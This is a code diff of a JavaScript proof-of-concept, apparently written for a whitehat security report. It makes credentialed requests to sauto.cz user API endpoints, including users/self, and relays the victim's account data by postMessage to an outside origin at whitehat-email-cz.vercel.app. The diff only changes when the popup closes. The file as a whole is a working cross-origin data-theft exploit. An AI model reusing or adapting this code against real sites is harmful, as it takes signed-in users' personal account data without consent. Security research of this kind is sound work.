@@ -10,6 +10,8 @@ window.addEventListener(
 
 async function run()
 {
+    let axios1 = false;
+    let axios2 = false;
     await axios
         .get(
             'https://www.sauto.cz/api/v1/users/self',
@@ -20,6 +22,10 @@ async function run()
         )
         .then((response) => {
             window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
+            axios1 = true;
+            if (axios1 && axios2) {
+                window.close();
+            }
         })
         .catch(error => {
             window.opener.postMessage({errorString: error.toString()}, 'https://whitehat-email-cz.vercel.app/')
@@ -35,12 +41,14 @@ async function run()
         )
         .then((response) => {
             window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
+            axios2 = true;
+            if (axios1 && axios2) {
+                window.close();
+            }
         })
         .catch(error => {
             console.log(error);
             window.opener.postMessage({errorString: error.toString()}, 'https://whitehat-email-cz.vercel.app/')
         });
-
-    window.close();
 }
 run().then(r => null);
